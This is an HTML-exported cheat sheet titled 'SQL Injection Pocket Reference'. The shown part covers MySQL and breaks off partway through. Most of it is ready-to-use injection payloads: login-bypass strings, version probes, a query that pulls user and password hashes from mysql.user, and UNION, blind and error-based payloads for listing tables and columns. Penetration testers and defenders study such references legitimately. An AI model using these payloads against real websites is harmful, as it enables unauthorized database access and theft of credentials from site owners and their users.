<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head>


<script>function a(c){this.t={};this.tick=function(c,e,b){b=b!=void 0?b:(new Date).getTime();this.t[c]=[b,e]};this.tick("start",null,c)}var d=new a;window.jstiming={Timer:a,load:d};try{var f=null;window.chrome&&window.chrome.csi&&(f=Math.floor(window.chrome.csi().pageT));f==null&&window.gtbExternal&&(f=window.gtbExternal.pageT());f==null&&window.external&&(f=window.external.pageT);f&&(window.jstiming.pt=f)}catch(g){};
</script>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
<!-- base -->
<title>SQL Injection Pocket Reference</title>
<style type="text/css">
/* default css */
table {
font-size: 1em;
line-height: inherit;
border-collapse: collapse;
}
tr {
text-align: left;
}
div, address, ol, ul, li, option, select {
margin-top: 0px;
margin-bottom: 0px;
}
p {
margin: 0px;
}
pre {
font-family: Courier New;
white-space: pre-wrap;
margin:0;
}
body {
margin: 6px;
padding: 0px;
font-family: Verdana, sans-serif;
font-size: 10pt;
background-color: #ffffff;
color: #000;
}
img {
-moz-force-broken-image-icon: 1;
}
@media screen {
html.pageview {
background-color: #f3f3f3 !important;
overflow-x: hidden;
overflow-y: scroll;
}
body {
min-height: 1100px;
counter-reset: __goog_page__;
}
* html body {
height: 1100px;
}
/* Prevent repaint errors when scrolling in Safari. This "Star-7" css hack
targets Safari 3.1, but not WebKit nightlies and presumably Safari 4.
That's OK because this bug is fixed in WebKit nightlies/Safari 4 :-). */
html*#wys_frame::before {
content: '\A0';
position: fixed;
overflow: hidden;
width: 0;
height: 0;
top: 0;
left: 0;
}
.pageview body {
border-top: 1px solid #ccc;
border-left: 1px solid #ccc;
border-right: 2px solid #bbb;
border-bottom: 2px solid #bbb;
width: 648px !important;
margin: 15px auto 25px;
padding: 40px 50px;
}
/* IE6 */
* html {
overflow-y: scroll;
}
* html.pageview body {
overflow-x: auto;
}
.writely-callout-data {
display: none;
}
.writely-footnote-marker {
background-image: url('images/footnote_doc_icon.gif');
background-color: transparent;
background-repeat: no-repeat;
width: 7px;
overflow: hidden;
height: 16px;
vertical-align: top;
-moz-user-select: none;
}
.editor .writely-footnote-marker {
cursor: move;
}
.writely-footnote-marker-highlight {
background-position: -15px 0;
-moz-user-select: text;
}
.writely-footnote-hide-selection ::-moz-selection, .writely-footnote-hide-selection::-moz-selection {
background: transparent;
}
.writely-footnote-hide-selection ::selection, .writely-footnote-hide-selection::selection {
background: transparent;
}
.writely-footnote-hide-selection {
cursor: move;
}
/* Comments */
.writely-comment-yellow {
background-color: #ffffd7;
}
.writely-comment-orange {
background-color: #ffe3c0;
}
.writely-comment-pink {
background-color: #ffd7ff;
}
.writely-comment-green {
background-color: #d7ffd7;
}
.writely-comment-blue {
background-color: #d7ffff;
}
.writely-comment-purple {
background-color: #eed7ff;
}
.br_fix span+br:not(:-moz-last-node) {
position:relative;
left: -1ex
}
#cb-p-tgt {
font-size: 8pt;
padding: .4em;
background-color: #ddd;
color: #333;
}
#cb-p-tgt-can {
text-decoration: underline;
color: #36c;
font-weight: bold;
margin-left: 2em;
}
#cb-p-tgt .spin {
width: 16px;
height: 16px;
background: url(//ssl.gstatic.com/docs/clipboard/spin_16o.gif) no-repeat;
}
}
h6 { font-size: 8pt }
h5 { font-size: 8pt }
h4 { font-size: 10pt }
h3 { font-size: 12pt }
h2 { font-size: 14pt }
h1 { font-size: 18pt }
blockquote {padding: 10px; border: 1px #DDD dashed }
.webkit-indent-blockquote { border: none; }
a img {border: 0}
.pb {
border-width: 0;
page-break-after: always;
/* We don't want this to be resizeable, so enforce a width and height
using !important */
height: 1px !important;
width: 100% !important;
}
.editor .pb {
border-top: 1px dashed #C0C0C0;
border-bottom: 1px dashed #C0C0C0;
}
div.google_header, div.google_footer {
position: relative;
margin-top: 1em;
margin-bottom: 1em;
}
/* Table of contents */
.editor div.writely-toc {
background-color: #f3f3f3;
border: 1px solid #ccc;
}
.writely-toc > ol {
padding-left: 3em;
font-weight: bold;
}
ol.writely-toc-subheading {
padding-left: 1em;
font-weight: normal;
}
/* IE6 only */
* html writely-toc ol {
list-style-position: inside;
}
.writely-toc-none {
list-style-type: none;
}
.writely-toc-decimal {
list-style-type: decimal;
}
.writely-toc-upper-alpha {
list-style-type: upper-alpha;
}
.writely-toc-lower-alpha {
list-style-type: lower-alpha;
}
.writely-toc-upper-roman {
list-style-type: upper-roman;
}
.writely-toc-lower-roman {
list-style-type: lower-roman;
}
.writely-toc-disc {
list-style-type: disc;
}
/* Ordered lists converted to numbered lists can preserve ordered types, and
vice versa. This is confusing, so disallow it */
ul[type="i"], ul[type="I"], ul[type="1"], ul[type="a"], ul[type="A"] {
list-style-type: disc;
}
ol[type="disc"], ol[type="circle"], ol[type="square"] {
list-style-type: decimal;
}
/* end default css */
/* custom css */
/* end custom css */
/* ui edited css */
body {
font-family: Verdana;
font-size: 12.0pt;
line-height: 1.5;
background-color: #ffffff;
}
/* end ui edited css */
/* editor CSS */
.editor a:visited {color: #551A8B}
.editor table.zeroBorder {border: 1px dotted gray}
.editor table.zeroBorder td {border: 1px dotted gray}
.editor table.zeroBorder th {border: 1px dotted gray}
.editor div.google_header, .editor div.google_footer {
border: 2px #DDDDDD dashed;
position: static;
width: 100%;
min-height: 2em;
}
.editor .misspell {background-color: yellow}
.editor .writely-comment {
font-size: 9pt;
line-height: 1.4;
padding: 1px;
border: 1px dashed #C0C0C0
}
/* end editor CSS */
</style>
<style>
body {
margin: 0px;
}
#doc-contents {
margin: 6px;
}
#google-view-footer {
clear: both;
border-top: thin solid;
padding-top: 0.3em;
padding-bottom: 0.3em;
}
a.google-small-link:link, a.google-small-link:visited {
color:#112ABB;
font-family:Arial,Sans-serif;
font-size:11px !important;
}
body, p, div, td {
direction: inherit;
}
@media print {
#google-view-footer {
display: none;
}
}
</style>
<script>
function viewOnLoad() {
if (document.location.href.indexOf('spi=1') != -1) {
if (navigator.userAgent.toLowerCase().indexOf('msie') != -1) {
window.print();
} else {
window.setTimeout(window.print, 10);
}
}
if (document.location.href.indexOf('hgd=1') != -1) {
var footer = document.getElementById("google-view-footer");
if (footer) {
footer.style.display = 'none';
}
}
}
</script>
</head><body onload="window.jstiming.load.tick('ol'); window.jstiming.report(window.jstiming.load, null, document.location.protocol == 'https:' ? 'https://gg.google.com/csi' : null);">
<div id="doc-contents">
<div style="text-align: center;"><p><font size="5"><b>SQL Injection Pocket Reference</b></font></p><p><b><font color="#ffffff" size="1">(SQL Injection Cheat Sheet)</font></b></p></div><div style="text-align: center;"><font size="2"><b><br></b></font><div style="text-align: left;"><div class="writely-toc" id="WritelyTableOfContents" toctype="none+none"><ol class="writely-toc-none"><li><font size="2"><a href="#MySQL_32011487842497566_647495_5262302681189097" target="_self">MySQL</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Default_Databases_473875522243" target="_self">Default Databases</a></font></li><li><font size="2"><a href="#Comment_Out_Query_152169074820" target="_self">Comment Out Query</a></font></li><li><font size="2"><a href="#Testing_Injection_073254647881" target="_self">Testing Injection</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Strings_14007699198109558_7970" target="_self">Strings</a></font></li><li><font size="2"><a href="#Numeric_4338548055966881_56574" target="_self">Numeric</a></font></li><li><font size="2"><a href="#In_a_login_5561435762105195_27" target="_self">In a login</a></font></li></ol><li><font size="2"><a href="#Testing_Version_24633832039633" target="_self">Testing Version</a></font></li><li><font size="2"><a href="#MySQL_specific_code_7428488873" target="_self">MySQL-specific code</a></font></li><li><font size="2"><a href="#Retrieving_DB_usernames_passwo" target="_self">Database Credentials</a></font></li><li><font size="2"><a href="#Database_Names_222020192537456" target="_self">Database Names</a></font></li><li><font size="2"><a href="#Tables_Columns_827613132540136_8751942789560926" target="_self">Tables &amp; Columns</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Finding_out_column_33061183849" target="_self">Finding out number of columns</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Order_By" target="_self">Order By</a></font></li><li><font size="2"><a href="#Error_Based" target="_self">Error Based</a></font></li></ol><li><font size="2"><a href="#Retrieving_Tables_357707111397_5439647078742209" target="_self">Retrieving Tables</a></font></li><li><font size="2"><a href="#Retrieving_Columns_43621163186_44774441667147635" target="_self">Retrieving Columns</a></font></li><li><font size="2"><a href="#PROCEDURE_ANALYSE_596077424008" target="_self">PROCEDURE ANALYSE()</a></font></li><li><font size="2"><a href="#Retrieving_Multiple_Tables_Col" target="_self">Retrieving Multiple Tables/Columns at once</a></font></li><li><font size="2"><a href="#Find_Tables_from_Column_Name_4" target="_self">Find Tables from Column Name</a></font></li><li><font size="2"><a href="#Find_Column_From_Table_Name_98" target="_self">Find Column From Table Name</a></font></li></ol><li><font size="2"><a href="#Avoiding_the_use_of_single_dou_6348401808344327" target="_self">Avoiding the use of single/double quotations</a></font></li><li><font size="2"><a href="#String_concatenation_307574598" target="_self">String concatenation</a></font></li><li><font size="2"><a href="#Privileges_4539396045729518_17" target="_self">Privileges</a></font></li><li><font size="2"><a href="#FILE_privilege_950937865049773" target="_self">FILE privilege</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#MySQL_4_5_33693227241850277_08" target="_self">MySQL 4/5</a></font></li><li><font size="2"><a href="#MySQL_5_9751107808110009_82691" target="_self">MySQL 5</a></font></li></ol><li><font size="2"><a href="#Out_Of_Band_Channeling_8729303" target="_self">Out Of Band Channeling</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Timing_11805841577434628_73004" target="_self">Timing</a></font></li><li><font size="2"><a href="#DNS_requires_FILE_privilege_72" target="_self">DNS (requires FILE privilege)</a></font></li><li><font size="2"><a href="#SMB_requires_FILE_privilege_92" target="_self">SMB (requires FILE privilege)</a></font></li></ol><li><font size="2"><a href="#Reading_Files_requires_FILE_pr" target="_self">Reading Files (requires FILE privilege)</a></font></li><li><font size="2"><a href="#Writing_Files_requires_FILE_pr" target="_self">Writing Files (requires FILE privilege)</a></font></li><li><font size="2"><a href="#Stacked_Queries_with_PDO_26260" target="_self">Stacked Queries with PDO</a></font></li><li><font size="2"><a href="#User_Defined_Functions_3549701" target="_self">User Defined Functions</a></font></li><li><font size="2"><a href="#Fuzzing_8887572148166935_78069" target="_self">Fuzzing and Obfuscation</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Allowed_Intermediary_Character_45253620241785364" target="_self">Allowed Intermediary Characters</a></font></li><li><font size="2"><a href="#Allowed_Intermediary_Character" target="_self">Allowed Intermediary Characters after AND/OR</a></font></li></ol><li><font size="2"><a href="#Operators_671486718712981_8325" target="_self">Operators</a></font></li><li><font size="2"><a href="#Constants_37327503227982783_09" target="_self">Constants</a></font></li><li><font size="2"><a href="#MySQL_Functions_40317880650083" target="_self">MySQL Functions()</a></font></li><li><font size="2"><a href="#MySQL_Password_Hashing_Taken_f" target="_self">MySQL Password Hashing</a></font></li><li><font size="2"><a href="#MySQL_Password_Cracker_9393974" target="_self">MySQL Password() Cracker</a></font></li></ol><li><font size="2"><a href="#MSSQL_11289749828037232_605030_33123298368804843" target="_self">MSSQL</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Default_Databases_084865739132" target="_self">Default Databases</a></font></li><li><font size="2"><a href="#Comment_Out_Query_147209078262_6026431026487483" target="_self">Comment Out Query</a></font></li><li><font size="2"><a href="#Testing_Version_45404268473343_22317706867605192" target="_self">Testing Version</a></font></li><li><font size="2"><a href="#Retrieving_user_names_password" target="_self">Database Credentials</a></font></li><li><font size="2"><a href="#Database_Server_Hostname_24749" target="_self">Database Server Hostname</a></font></li><li><font size="2"><a href="#Listing_Databases_901208701422" target="_self">Database Names</a></font></li><li><font size="2"><a href="#Tables_Columns_006405132822692" target="_self">Tables &amp; Columns</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Retrieving_Tables_912017414346" target="_self">Retrieving Tables</a></font></li><li><font size="2"><a href="#Retrieving_Columns_71532329893" target="_self">Retrieving Columns</a></font></li><li><font size="2"><a href="#Retrieving_Multiple_Tables_Col_0027392041642497755" target="_self">Retrieving Multiple Tables/Columns at once</a></font></li></ol><li><font size="2"><a href="#OPENROWSET_Attacks_01821536291" target="_self">OPENROWSET Attacks</a></font></li><li><font size="2"><a href="#System_Command_Execution_62486" target="_self">System Command Execution</a></font></li><li><font size="2"><a href="#SP_PASSWORD_Hiding_Query_01275" target="_self">SP_PASSWORD (Hiding Query)</a></font></li><li><font size="2"><a href="#Stacked_Queries_74329470796510" target="_self">Stacked Queries</a></font></li><li><font size="2"><a href="#Fuzzing_and_Obfuscation_688072_8761287548374126" target="_self">Fuzzing and Obfuscation</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Encodings_765702735632658_2887" target="_self">Encodings</a></font></li><li><font size="2"><a href="#Allowed_Intermediary_Character_9818568086386211" target="_self">Allowed Intermediary Characters</a></font></li><li><font size="2"><a href="#Allowed_Intermediary_Character_770260241426459" target="_self">Allowed Intermediary Characters after AND/OR</a></font></li></ol><li><font size="2"><a href="#MSSQL_Password_Hashing_5148090" target="_self">MSSQL Password Hashing</a></font></li><li><font size="2"><a href="#MSSQL_Password_Cracker_9522853_804210340199028" target="_self">MSSQL Password Cracker</a></font></li></ol><li><font size="2"><a href="#ORACLE_07722236053086817_05771" target="_self">ORACLE</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Default_Databases_835670871427_3261308385365387" target="_self">Default Databases</a></font></li><li><font size="2"><a href="#Comment_Out_Query_147209078262" target="_self">Comment Out Query</a></font></li><li><font size="2"><a href="#Testing_Version_45404268473343" target="_self">Testing Version</a></font></li><li><font size="2"><a href="#Retrieving_Users_Passwords_589_1155335966680564" target="_self">Database Credentials</a></font></li><li><font size="2"><a href="#Retrieving_Databases_508238462_7729031428724391" target="_self">Database Names</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Current_Database_4848270732909_6606606173680046" target="_self">Current Database</a></font></li><li><font size="2"><a href="#User_Databases_772196189267560_6847389760974008" target="_self">User Databases</a></font></li></ol><li><font size="2"><a href="#Retrieving_Tables_Columns_0685_8079150577052975" target="_self">Tables &amp; Columns</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Retrieving_Tables_928967117331" target="_self">Retrieving Tables</a></font></li><li><font size="2"><a href="#Retrieving_Columns_94002029672_25307474183440437" target="_self">Retrieving Columns</a></font></li><li><font size="2"><a href="#Finding_Tables_from_Column_Nam_44700741806267885" target="_self">Finding Tables from Column Name</a></font></li><li><font size="2"><a href="#Finding_Column_From_Table_Name_5853406596825301" target="_self">Finding Column From Table Name</a></font></li></ol><li><font size="2"><a href="#Obfuscation_7676919663790613_8" target="_self">Fuzzing and Obfuscation</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#Avoiding_the_use_of_single_dou" target="_self">Avoiding the use of single/double quotations</a></font></li></ol><li><font size="2"><a href="#Out_Of_Band_Channeling_9292138_0905267475869952" target="_self">Out Of Band Channeling</a></font></li><ol class="writely-toc-none writely-toc-subheading" style="margin-left: 0pt;"><li><font size="2"><a href="#_Time_Delay_07622388936579227_" target="_self">Time Delay</a></font></li><li><font size="2"><a href="#_Heavy_Query_Time_delays_08850_14402908531386716" target="_self">Heavy Query Time delays</a></font></li></ol></ol></ol></div></div><b><br><br></b></div><div style="text-align: center;"><br></div><p><font size="5"><b>Credits</b></font></p><br><p>I
 would like to thank .mario, Reiners and everyone else who has helped me
 in making this document what it is today. You can reach me at 
twitter.com/LightOS with any suggestions you may have and remember this 
is still a work in progress, so be sure to check in frequently for 
updates.</p><p><br></p><h2><a id="MySQL_32011487842497566_647495_5262302681189097" name="MySQL_32011487842497566_647495_5262302681189097"></a><b>MySQL</b></h2><b><u><br></u></b><h3><a id="Default_Databases_473875522243" name="Default_Databases_473875522243"></a><b>Default Databases</b></h3><ul><li><font size="3"><font face="courier new">mysql</font> (Privileged)</font></li><li><font size="3"><font face="courier new">information_schema</font> (Version &gt;= 5)</font></li></ul><br><h3><a id="Comment_Out_Query_152169074820" name="Comment_Out_Query_152169074820"></a>Comment Out Query</h3><ul><li><font size="3"><font face="courier new">#</font></font></li><li><font size="3" face="courier new">/*</font></li><li><font size="3"><font face="courier new">-- -</font></font></li><li><font size="3"><font face="courier new">;%00</font></font></li><li><font size="3"><font face="courier new">`</font></font></li></ul><br><div><font size="3"><i>Example:</i></font></div><ul><li><font size="3"><font face="courier new">' OR 1=1 -- -</font></font><font size="3" face="courier new">' ORDER BY id;</font></li><li><font face="'Courier New'">' UNION SELECT 1, 2, 3`</font></li></ul><br><i>Note:</i><div><i>The backtick can only be used to end a query when used as an alias.</i></div><i><br></i><h3><a id="Testing_Injection_073254647881" name="Testing_Injection_073254647881"></a><b>Testing Injection</b></h3><ul><li><font size="3">False</font></li><ul><li><font size="3">The query is invalid (MySQL errors/missing content on website)</font></li></ul><li><font size="3">True</font></li><ul><li><font size="3">The query is valid (content is displayed as usual)</font></li></ul></ul><br><h4><a id="Strings_14007699198109558_7970" name="Strings_14007699198109558_7970"></a>Strings</h4><ul style="font-family: Courier New;"><li><font size="3">'&nbsp; - &nbsp;<font face="Verdana">False</font>&nbsp;</font></li><li><font size="3">'' - &nbsp;<font face="Verdana">True</font></font></li><li><font size="3">" &nbsp;- &nbsp;<font face="Verdana">False</font></font></li><li><font size="3">"" - &nbsp;<font face="Verdana">True</font></font></li><li style="text-align: left;"><font face="Verdana"><font size="3">\&nbsp; &nbsp; <font face="courier new">-</font> &nbsp;<font face="Verdana">&nbsp; False</font></font></font></li><li style="text-align: left;"><font size="3"><font face="Verdana">\\&nbsp;&nbsp; <font face="courier new">-</font>&nbsp;&nbsp;&nbsp; True<br></font></font></li></ul><br><h4><a id="Numeric_4338548055966881_56574" name="Numeric_4338548055966881_56574"></a>Numeric</h4><ul style="font-family: Courier New;"><li><font size="3">AND 0 - <font face="Verdana">False</font></font></li><li><font size="3">AND 1 - <font face="Verdana">True</font></font></li><li><font size="3">2-1&nbsp;&nbsp; - <font face="Verdana">1</font></font></li><li><font size="3">3-2&nbsp;&nbsp; - <font face="Verdana">1</font></font></li></ul><div>&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div><h4><a id="In_a_login_5561435762105195_27" name="In_a_login_5561435762105195_27"></a>In a login</h4><ul><li style="font-family: 'Courier New';"><font size="3">' OR '1</font></li><li style="font-family: 'Courier New';"><font size="3"> ' OR 1 -- -</font></li><li style="font-family: 'Courier New';"><font size="3">" OR "" = "</font></li><li style="font-family: 'Courier New';"><font size="3"><font face="'courier new'">" OR 1 = 1 -- - &nbsp;</font></font></li><li style="font-family: 'Courier New';"><font size="3"> '='</font></li><li style="font-family: 'Courier New';"><font size="3"> 'LIKE'</font></li><li style="font-family: 'Courier New';"><font size="3"> '=0--+</font></li></ul><br><font size="3"><i>Example: </i></font> <font size="3"><br></font><ul><li><font size="3"><font face="courier new">SELECT * FROM Users WHERE username = '<i>Mike</i>' AND password = '</font></font><font size="3" face="courier new">'='</font><font size="3"><font face="courier new">'</font></font></li></ul><ul><li><font size="3"><font face="courier new">SELECT * FROM Users WHERE username = '<i>Mike</i>' AND password = '</font></font><font size="3"><font face="'Courier New'">' OR '' = '</font></font><font size="3"><b><font face="'Courier New'">'</font></b></font></li></ul><font size="3"><br></font><div><font size="3"><i>Note:</i><br></font><ul><li><font size="3"><i>You can use as many apostrophes/quotations as you want as long as they pair up</i></font></li><li><font size="3" face="courier new"><i>SELECT * FROM Articles WHERE id = '121</i></font><b><font size="3" face="courier new"><i>'''''''''''''</i></font></b></li><li><font size="3"><i>It's also possible to continue the statement after the chain of quotes: </i></font><font size="3"><i><font face="'courier new'">SELECT '1'''''<font size="3">""</font></font><font face="'courier new'"> UNION SELECT '2'</font><font face="'Courier New'"> # 1 and 2</font></i></font></li><li><font size="3"><i>Quotes escape quotes: </i></font><font size="3" face="Courier New"><span class="syntax"><span class="syntax_alpha syntax_alpha_reservedWord"><i>SELECT</i></span> <span class="syntax_quote syntax_quote_single"><i>'1''' # 1'</i></span></span></font></li></ul><br><h3><a id="Testing_Version_24633832039633" name="Testing_Version_24633832039633"></a><b>Testing Version</b></h3><ul style="font-family: Courier New;"><li><font size="3">VERSION();</font></li><li><font size="3">@@VERSION;</font></li><li><font size="3">@@GLOBAL.VERSION</font></li></ul><font size="3"><br></font><div><font size="3"><i>Example:&nbsp;</i></font><font size="3"><font face="courier new">' AND MID(VERSION(),1,1) = '5</font>&nbsp;&nbsp;<i>- True if MySQL version is 5</i></font></div><font size="3"><i><br></i></font><div><font size="3"><i>Note:<br></i></font><ul><li><i><font size="3">You can use comments in between the name and the parenthesis and inside the parenthesis<br></font></i></li><li><i><font size="3">Example:</font>&nbsp;<font size="3"><font face="courier new">VERSION/**/(/**/)</font></font></i></li><li><i>Output will contain&nbsp;<font face="courier new">-nt-log</font>&nbsp;in case the DBMS runs on a Windows based machine</i></li></ul><br></div><h3><a id="MySQL_specific_code_7428488873" name="MySQL_specific_code_7428488873"></a>MySQL<b>-specific code</b></h3><div><font size="3">MySQL
 allows you to specify the version number after the exclamation mark. 
The syntax within the comment is only executed if the version is greater
 or equal to the specified version number.</font><br><br></div><font size="3"><i>Example:</i></font></div><div><ul><li><font size="3" face="'Courier New'"><font size="3">UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+</font><br></font></li><li><font size="3" face="'Courier New'">SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/*/);</font></li></ul><br><h3><a id="Retrieving_DB_usernames_passwo" name="Retrieving_DB_usernames_passwo"></a><b>Database Credentials</b></h3><ul><li><font size="3">Table: <font face="'Courier New'">mysql.</font><font face="courier new">user</font> (Privileged)</font></li><li><font size="3">Columns: <font face="courier new">user, password</font></font></li><li><font size="3">Current User: <font face="courier new">user()</font>, <font face="courier new"><font size="3"><font face="courier new">current_user()</font></font>, system_user(), session_user()<br></font></font></li></ul><br><i>Example:<br></i><ul><li><font size="3"><font face="courier new">SELECT current_user;</font></font><br></li><li><font size="3"><font face="courier new">UNION SELECT CONCAT(user, 0x3A, password) FROM mysql.user WHERE user = '<i>root</i>'</font></font></li></ul><br><h3><a id="Database_Names_222020192537456" name="Database_Names_222020192537456"></a><font size="3"><b>Database Names</b></font></h3><ul><li><font size="3"><font color="#333333">Tables:<font face="'Courier New'"> information_schema.<font face="'courier new'"><font color="#333333"><font size="3">schemata</font></font></font>, mysql.db</font></font></font></li><li><font size="3"><font color="#333333">Columns:<font face="'Courier New'"> schema_name, db</font></font></font></li><li><font size="3"><font color="#333333">Current DB:<font face="'Courier New'"> database(), schema()<br></font></font></font></li></ul><font size="3"><br></font><div><font color="#333333" size="3"><i>Example:</i><br></font></div><ul><li><font size="3"><font color="#333333"><font face="'Courier New'">UNION SELECT schema_name FROM information_schema.schemata</font></font><br></font></li><li><font size="3"><font color="#333333"><font face="'Courier New'">SELECT DISTINCT(db) FROM mysql.db </font>(Privileged)</font><br></font></li></ul><br><h3><a id="Tables_Columns_827613132540136_8751942789560926" name="Tables_Columns_827613132540136_8751942789560926"></a>Tables &amp; Columns</h3><h4><a id="Finding_out_column_33061183849" name="Finding_out_column_33061183849"></a><b><b>Finding out number of columns</b></b></h4><h5><a id="Order_By" name="Order_By"></a><font size="2"><font face="Verdana">Order By</font></font></h5><ul style="font-family: 'Courier New';"><li><font size="3">ORDER BY 1</font></li><li><font size="3">ORDER BY 2</font></li><li><font size="3">ORDER BY ...</font></li></ul><br><div><font size="3"><i>Note:</i></font></div><div><font size="3"><i>Keep incrementing the number until you get a False response.</i></font></div><font size="3"><br></font><font size="3"><font face="Verdana"><i>Example:</i></font></font></div><ul><li><font size="3"><font face="'courier new'"><font size="3">1' ORDER BY 1-- - <font face="Verdana">True</font></font></font><br></font></li><li><font size="3"><font face="'courier new'"><font size="3">1' ORDER BY 2-- -&nbsp;<font size="3"><font face="Verdana">True</font></font></font></font><br></font></li><li><font size="3"><font face="'courier new'"><font size="3">1' ORDER BY 3-- -&nbsp;<font size="3"><font face="Verdana">True</font></font></font></font><br></font></li><li><font size="3"><font face="'courier new'"><font size="3">1' ORDER BY 4-- -&nbsp;<font size="3"><font face="Verdana">False (Query is only using 3 columns)</font></font></font></font><br></font></li><li><font face="'Courier New'"><font size="3">-1' UNION SELECT 1,2,3-- -</font></font></li></ul><br><h5><a id="Error_Based" name="Error_Based"></a><font size="2">Error Based</font></h5><ul><li><font face="'Courier New'">AND (SELECT * FROM <i><font><span style="background-color: rgb(255, 255, 255);">SOME_EXISTING_TABLE</span></font></i>) = 1</font></li><li><font face="'Courier New'">Operand should contain <i>3</i> column(s)</font><br></li></ul><br><div><i>Note:</i></div><ul><li><i>This works if you know the table name you're after and error showing is enabled</i></li><li><i>It will return the amount of columns in the table, not the query.<br></i></li></ul><br><h4><a id="Retrieving_Tables_357707111397_5439647078742209" name="Retrieving_Tables_357707111397_5439647078742209"></a><b>Retrieving Tables</b></h4><ul><li><font size="3">Union:</font></li><ul><li><font size="3"><font face="courier new">UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;</font></font>&nbsp;</li></ul><li><font size="3">Blind:</font></li><ul><li><font size="3" face="courier new">AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'</font></li></ul><li>Error:</li><ul><li><div style="margin-left: 0px; margin-right: 0px;"><a class="fav-action non-fav" id="o2oq" style="height: 15px; margin-left: 0px; margin-right: 0px; text-decoration: none; width: 15px;" title="favorite this tweet"></a></div><span class="entry-content" style="margin-left: 0px; margin-right: 0px;"><font size="3"><font face="'Courier New'"><font color="#000000">AND(SELECT
 COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY 
CONCAT((SELECT table_name FROM information_schema.tables LIMIT 
1),FLOOR(RAND(0)*2)))</font></font></font></span><br></li><li><span class="entry-content" style="margin-left: 0px; margin-right: 0px;"><font size="3"><font face="'Courier New'"><font color="#000000">(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);</font></font></font></span></li><li><font size="3"><font face="courier new">AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name&nbsp; FROM&nbsp; information_schema.tables LIMIT 1)));-- <i style="font-family: Verdana;">Available in 5.1.5</i></font><br></font></li></ul></ul><br><i><font size="3">Note:<br></font></i><ul><li><i><font size="3">version=9 for MySQL 4</font></i></li><li><i><font size="3">version=10 for MySQL 5</font></i></li></ul><i><br></i><h4><a id="Retrieving_Columns_43621163186_44774441667147635" name="Retrieving_Columns_43621163186_44774441667147635"></a><b>Retrieving Columns</b></h4><ul><li><font size="3">Union:</font></li><ul><li><font size="3" face="courier new">UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '<font><span style="background-color: rgb(255, 255, 255);">tablename</span></font>'</font></li></ul><li><font size="3">Blind:</font></li><ul><li><font size="3" face="courier new">AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &nbsp;&gt; 'A'</font></li></ul><li><p>Error:</p></li><ul><li><div style="margin-left: 0px; margin-right: 0px;"><a class="fav-action non-fav" id="pjhu" style="height: 15px; margin-left: 0px; margin-right: 0px; text-decoration: none; width: 15px;" title="favorite this tweet"></a></div><font size="3"><span class="entry-content" style="margin-left: 0px; margin-right: 0px;"><font color="#000000"><font size="3"><font face="'Courier New'">AND(SELECT
 COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY 
CONCAT((SELECT column_name FROM information_schema.columns LIMIT 
1),FLOOR(RAND(0)*2)))</font></font></font></span><br></font></li><li><span class="entry-content" style="margin-left: 0px; margin-right: 0px;"><font color="#000000"><font face="'courier new'"><font size="3">(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);</font></font></font></span></li><li><span class="entry-content" style="margin-left: 0px; margin-right: 0px;"><font color="#000000"><font size="3"><font size="3"><font face="courier new">AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name&nbsp; FROM&nbsp; information_schema.columns LIMIT 1)));-- <i style="font-family: Verdana;">Available in MySQL 5.1.5</i></font></font><br></font></font></span></li><li><span class="entry-content" style="margin-left: 0px; margin-right: 0px;"><font color="#000000"><font size="3"><font face="'Courier New'">AND (1,2,3) = (SELECT * FROM <i>SOME_EXISTING_TABLE</i> UNION SELECT 1,2,3 LIMIT 1)-- <font face="Verdana"><i>Fixed in MySQL 5.1</i></font><br></font></font></font></span></li></ul><li><font size="3">Procedure Analyse():</font></li><ul><li><font size="3">Refer to <font face="'Courier New'">PROCEDURE ANALYSE() </font>below.</font></li></ul></ul><font size="3"><br></font><div><i><font size="3">Note:<br>The <font face="courier new">GROUP_CONCAT()</font> function allows grouping of the tables/columns, instead of viewing them one at a time.<br><br>Note: <br></font></i><ul><li><i><font size="3">Output is limited to 1024 chars by default. </font></i></li><li><i><font size="3">All default database table names: ~900 